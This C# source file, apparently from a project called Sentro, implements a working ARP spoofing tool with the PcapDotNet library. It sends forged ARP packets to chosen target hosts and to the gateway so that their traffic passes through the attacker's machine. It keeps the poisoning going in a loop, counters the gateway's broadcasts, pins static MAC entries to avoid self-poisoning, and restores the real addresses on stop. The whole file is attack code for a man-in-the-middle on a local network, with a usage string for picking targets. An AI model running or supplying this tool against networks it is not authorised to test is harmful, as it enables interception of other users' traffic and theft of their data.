using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using Sentro.Utilities;

namespace Sentro.ARP
{
    public class ArpSpoofer : IArpSpoofer
    {
        public const string Tag = "ArpSpoofer";
        private static ArpSpoofer _arpSpoofer;        
        private HashSet<string> _excludedTargets;        
        private string _myIp, _myMac, _gatewayIp, _gatewayMac;          

        /*packet builders grouped here to avoid creating a new builder with each packet sent*/
        private Dictionary<string, PacketBuilder> _targetsPacketBuilders;
        private Dictionary<string, PacketBuilder> _gatewayPacketBuilders;

        /*report the detection or removal of current targeted machines,
          targets list is rebuild in case of change*/
        private bool _targetsChanged;

        /*report the status of ARP spoofer */
        private Status _status = Status.Off;

        private ArpSpoofer()
        {                        
            _excludedTargets = new HashSet<string>();
            _targetsPacketBuilders = new Dictionary<string, PacketBuilder>();
            _gatewayPacketBuilders = new Dictionary<string, PacketBuilder>();            
        }

        public static ArpSpoofer GetInstance()
        {
            return _arpSpoofer ?? (_arpSpoofer = new ArpSpoofer());
        }

        /*
            to perform arp attack you should change the mac address in the running machine for each target
            and the router to become 'Static' insted of 'Dynamic' so it doesn't change during the attack
            
            - this is important, using dynamic mac address will cause self poison
        */
        private void InsertAllStaticMacAddresses(NetworkInterface networkInterface)
        {                                
            NetworkUtilites.InsertStaticMac(networkInterface, _gatewayIp, _gatewayMac);
            foreach (var t in KvStore.TargetIps)
                NetworkUtilites.InsertStaticMac(networkInterface, t, KvStore.IpMac[t]);
        }

        /*
            assure change back static addresses to dynamic so any change in network afterward
            will take effect on this machine
        */
        private void DeleteAllStaticMacAddresses(NetworkInterface networkInterface)
        {            
            NetworkUtilites.DeleteStaticMac(networkInterface, _gatewayIp);
            foreach (var t in KvStore.TargetIps)
                NetworkUtilites.DeleteStaticMac(networkInterface, t);
        }

        /*
            Attack all targets and the router
            avoid calling 'SpoofFakeAddress' for every single target
        */
        private void SpoofAllFakeAddresses(NetworkInterface networkInterface, PacketCommunicator communicator)
        {                        
            foreach (string target in KvStore.TargetIps)
            {
                if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                    continue;
                SpoofGatewayInitialRequest(communicator, target);
                SpoofTargetInitialRequest(communicator, target);
            }
        }

        /*
            perform arp spoof to a single target
        */
        private void SpoofFakeAddress(NetworkInterface networkInterface, PacketCommunicator communicator, string target)
        {            
            if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                return;
            SpoofGatewayInitialRequest(communicator, target);
            SpoofTargetInitialRequest(communicator, target);
        }

       
        /*
            this is used insted of 'SpoofRealAddress' to avoid calling a method for each target
        */
        private void SpoofRealAddresses(PacketCommunicator communicator)
        {            
            foreach (string target in KvStore.TargetIps)
            {                
                SpoofGatewayFinalRequest(communicator, target);
                SpoofTargetFinalRequest(communicator, target);
            }            
        }

        /*
           reverse arp spoof effect so the internet is never down due to arp attack
       */
        private void SpoofRealAddress(PacketCommunicator communicator, string target)
        {            
            SpoofGatewayFinalRequest(communicator, target);
            SpoofTargetFinalRequest(communicator, target);
        }

        /*
            a while loop run in a thread pool to keep sending a spoofed arp replays
            a wait period is set in settings, decrease wait time if poison effect is lost often
        */
        private void SpoofContinuousAttack(PacketCommunicator communicator,NetworkInterface networkInterface)
        {
            Task.Run(() =>
            {
                /*convert to array so that adding a new ip will not affect the for loop*/
                string[] targetsArray = KvStore.TargetIps.ToArray();                
                _status = Status.Started;
                while (_status == Status.Started || _status == Status.Starting || _status == Status.Paused)
                {
                    if (_status == Status.Paused)
                    {
                        Task.Delay(5000).Wait();                        
                        continue;
                    }

                    if (_targetsChanged)
                        targetsArray = KvStore.TargetIps.ToArray();

                    foreach (string target in targetsArray)
                    {                        
                        if (MakeSureTargetIsReadyToBeAttacked(networkInterface, target) == false)
                            continue;
                        SpoofGateway(communicator, target);
                        SpoofTarget(communicator, target);

                    }

                    var delayDuration = Convert.ToInt32(Settings.GetInstance().Setting.ArpSpoofer.Frequency);                    
                    Task.Delay(delayDuration).Wait();
                }
            }).Wait();            
        }

        /*
            the main method to start the arp attack            
        */
        public void Spoof(string myIp, HashSet<string> targets)//hashset is used to eliminate duplicate IPs
        {            

            if (_status != Status.Off)
            {                
                return;                
            }            
                        
            _status = Status.Starting;            

            var livePacketDevice = NetworkUtilites.GetLivePacketDevice(myIp);

            KvStore.TargetIps.UnionWith(targets);
            _myIp = myIp;
            _myMac = livePacketDevice.GetMacAddress().ToString();
            _gatewayIp = NetworkUtilites.GetGatewayIp(livePacketDevice);
            _gatewayMac = NetworkUtilites.GetMacAddress(_gatewayIp);

            KvStore.IpMac.Add(_myIp,_myMac);
            KvStore.IpMac.Add(_gatewayIp,_gatewayMac);

            /*targets rarely change their mac address, also this function considerd costly*/                        
            foreach (var ip in targets)
                KvStore.IpMac.Add(ip, NetworkUtilites.GetMacAddress(ip));

            var networkInterface = livePacketDevice.GetNetworkInterface();                                  
        
            PacketCommunicator communicator = livePacketDevice.Open(50, PacketDeviceOpenAttributes.None, 50);

            BeforeAllAttack(livePacketDevice,communicator);

            SpoofContinuousAttack(communicator, networkInterface);/*block*/

            if (_status != Status.Stopped)
                AfterAttack(networkInterface, communicator);
                  
            communicator.Dispose();

        }

        /*
            initiate attack by setting static mac addresses and make a starter attack
        */
        private void BeforeAllAttack(LivePacketDevice livePacketDevice, PacketCommunicator communicator)
        {
            var networkInterface = livePacketDevice.GetNetworkInterface();
            Task.Run(() => FightBackAnnoyingBroadcasts(livePacketDevice));
            
            InsertAllStaticMacAddresses(networkInterface);
            SpoofAllFakeAddresses(networkInterface, communicator);
        }
      

        /*
            use this method to avoid method calling for each target            
        */
        private void AfterAttack(NetworkInterface networkInterface, PacketCommunicator communicator)
        {
            SpoofRealAddresses(communicator);
            DeleteAllStaticMacAddresses(networkInterface);
            _status = Status.Stopped;
        }

        /*
            clean up after attack by resetting mac addresses to dynamic and make a reverse attack to
            reconnect targets with the real router
        */
        private void AfterAttack(NetworkInterface networkInterface, PacketCommunicator communicator,string target)
        {
            SpoofRealAddress(communicator,target);
            NetworkUtilites.DeleteStaticMac(networkInterface,target);            
        }

        /*
            broadcasts are annoying and let targets find the real router
            so this will instantly send arp spoofed replay insted of the timed attack
            and hopefully target is not lost for long time
        */
        private void FightBackAnnoyingBroadcasts(LivePacketDevice nic)
        {            
            var ether = new EthernetLayer
            {
                Source = new MacAddress(_myMac),
                Destination = new MacAddress("FF:FF:FF:FF:FF:FF"),
                EtherType = EthernetType.None
            };
            

            PacketCommunicator communicator = nic.Open(500, PacketDeviceOpenAttributes.None, 50);
            communicator.SetFilter("arp && ether dst ff:ff:ff:ff:ff:ff");

            communicator.ReceivePackets(0, arp =>
            {
                var sourceIp = arp.Ethernet.IpV4.Source.ToString();
                if (sourceIp.Equals(_gatewayIp))
                {
                    var arplayer = new ArpLayer
                    {
                        ProtocolType = EthernetType.IpV4,
                        Operation = ArpOperation.Request,
                        SenderHardwareAddress = ether.Source.ToBytes(),
                        SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                        TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                        TargetProtocolAddress = arp.Ethernet.IpV4.Destination.ToBytes()
                    };
                    var packet = new PacketBuilder(ether, arplayer).Build(DateTime.Now);
                    communicator.SendPacket(packet);
                }
                else if (KvStore.IpMac.ContainsKey(sourceIp))
                {
                    SpoofGateway(communicator, sourceIp);
                }
            });            
            communicator.Dispose();
        }

        /*
            sends initial arp spoofed packet to the router ( gateway ) 
        */
        private void SpoofGatewayInitialRequest(PacketCommunicator communicator, string targetIp)
        {            
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_gatewayMac),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = ether.Source.ToBytes(),
                    SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        /*
           sends initial arp spoofed packet to the target
        */
        private void SpoofTargetInitialRequest(PacketCommunicator communicator, string targetIp)
        {
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(KvStore.IpMac[targetIp]),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = ether.Source.ToBytes(),
                    SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        /*
          sends arp spoofed packet to the router ( gateway ) 
        */
        private void SpoofGateway(PacketCommunicator communicator, string targetIp)
        {
            Task.Factory.StartNew(() =>
            {
                if (!_gatewayPacketBuilders.ContainsKey(targetIp))
                {
                    var ether = new EthernetLayer
                    {
                        Source = new MacAddress(_myMac),
                        Destination = new MacAddress(_gatewayMac),
                        EtherType = EthernetType.None,
                    };
                    var arp = new ArpLayer
                    {
                        ProtocolType = EthernetType.IpV4,
                        Operation = ArpOperation.Reply,
                        SenderHardwareAddress = ether.Source.ToBytes(),
                        SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                        TargetHardwareAddress = ether.Destination.ToBytes(),
                        TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                    };

                    _gatewayPacketBuilders.Add(targetIp, new PacketBuilder(ether, arp));
                }

                var packet = _gatewayPacketBuilders[targetIp].Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        /*
          sends arp spoofed packet to the target
        */
        private void SpoofTarget(PacketCommunicator communicator, string targetIp)
        {            
            Task.Factory.StartNew(() =>
            {
                if (!_targetsPacketBuilders.ContainsKey(targetIp))
                {
                    var ether = new EthernetLayer
                    {
                        Source = new MacAddress(_myMac),
                        Destination = new MacAddress(KvStore.IpMac[targetIp]),
                        EtherType = EthernetType.None,
                    };
                    var arp = new ArpLayer
                    {
                        ProtocolType = EthernetType.IpV4,
                        Operation = ArpOperation.Reply,
                        SenderHardwareAddress = ether.Source.ToBytes(),
                        SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                        TargetHardwareAddress = ether.Destination.ToBytes(),
                        TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                    };

                    _targetsPacketBuilders.Add(targetIp, new PacketBuilder(ether, arp));
                }

                var packet = _targetsPacketBuilders[targetIp].Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        /*
          sends arp final packet to the router ( gateway ) 
        */
        private void SpoofGatewayFinalRequest(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(_gatewayMac),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = new MacAddress(KvStore.IpMac[targetIp]).ToBytes(),
                    SenderProtocolAddress = new IpV4Address(targetIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(_gatewayIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        /*
          sends arp final spoofed packet to the target
        */
        private void SpoofTargetFinalRequest(PacketCommunicator communicator, string targetIp)
        {
            /*put everything in queue and let .Net manage threads*/
            Task.Factory.StartNew(() =>
            {
                var ether = new EthernetLayer
                {
                    Source = new MacAddress(_myMac),
                    Destination = new MacAddress(KvStore.IpMac[targetIp]),
                    EtherType = EthernetType.None,
                };
                var arp = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = new MacAddress(_gatewayMac).ToBytes(),
                    SenderProtocolAddress = new IpV4Address(_gatewayIp).ToBytes(),
                    TargetHardwareAddress = MacAddress.Zero.ToBytes(),
                    TargetProtocolAddress = new IpV4Address(targetIp).ToBytes()
                };
                var packet = new PacketBuilder(ether, arp).Build(DateTime.Now);
                communicator.SendPacket(packet);
            });
        }

        /*
            find the mac of a given ip and add it to the KvStore and insert the found mac as static
        */
        private bool MakeSureTargetIsReadyToBeAttacked(NetworkInterface networkInterface, string target)
        {
            if (KvStore.IpMac.ContainsKey(target))
                return true;

            var mac = NetworkUtilites.GetMacAddress(target);
            if (mac.Length <= 0)
                return false;

            KvStore.IpMac[target] = mac;
            NetworkUtilites.InsertStaticMac(networkInterface, target, KvStore.IpMac[target]);
            return true;
        }

        /*
            start a new arp spoofing to all machines in the network
        */
        public void Spoof(string myIp)
        {
            throw new NotImplementedException();
        }

        public void Include(string target)
        {
            KvStore.TargetIps.Add(target);
            _targetsChanged = true;
        }

        public void Include(HashSet<string> targets)
        {
            KvStore.TargetIps.UnionWith(targets);
            _targetsChanged = true;
        }

        public void Exclude(string target)
        {
            KvStore.TargetIps.Remove(target);
            _excludedTargets.Add(target);
            _targetsChanged = true;                                
        }

        public void Exclude(HashSet<string> targets)
        {
            KvStore.TargetIps.ExceptWith(targets);
            _excludedTargets.UnionWith(targets);
            _targetsChanged = true;
        }

        public void Stop()
        {
            _status = Status.Stopping;
            var livePacketDevice = NetworkUtilites.GetLivePacketDevice(_myIp);
            if(livePacketDevice == null)
                return;
            PacketCommunicator communicator = livePacketDevice.Open(1, PacketDeviceOpenAttributes.None, 10);
            AfterAttack(livePacketDevice.GetNetworkInterface(), communicator);
            communicator.Dispose();
        }

        public void Pause() => _status = Status.Paused;

        public void Resume() => _status = Status.Starting;

        public void Start() => _status = Status.Starting;

        public string Usage()
        {
            var usage = @"
arp [Your IP] spoof [Set of target ips]
arp [Your IP] spoof all -[Exclude target ip] .. -[Exclude target ip]
arp +[Include target ip] .. +[Include target ip] .. -[Exclude target ip]
arp stop
arp pause
arp start
arp resume
arp
";
            return usage;
        }

        public Status State() => _status;

        public enum Status
        {
            Paused,
            Stopped,
            Stopping,
            Starting,
            Started,
            Off
        }

    }
}
